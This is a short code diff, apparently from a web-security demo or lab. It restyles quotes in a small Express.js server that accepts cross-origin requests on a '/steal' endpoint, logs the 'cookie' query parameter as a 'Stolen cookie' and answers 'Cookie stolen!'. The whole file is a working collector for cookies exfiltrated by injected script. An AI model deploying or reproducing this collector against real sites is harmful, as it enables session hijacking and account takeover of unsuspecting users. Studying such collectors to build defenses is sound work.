@@ -1,14 +1,14 @@
-const express = require('express');
-const cors = require('cors');
+const express = require("express");
+const cors = require("cors");
 const app = express();
 const port = 3001;
 
-app.use(cors()); // Enable CORS for all origins (allow all domains)
+app.use(cors());
 
-app.get('/steal', (req, res) => {
+app.get("/steal", (req, res) => {
   const cookie = req.query.cookie;
-  console.log('Stolen cookie:', cookie);
-  res.send('Cookie stolen!');
+  console.log("Stolen cookie:", cookie);
+  res.send("Cookie stolen!");
 });
 
 app.listen(port, () => {
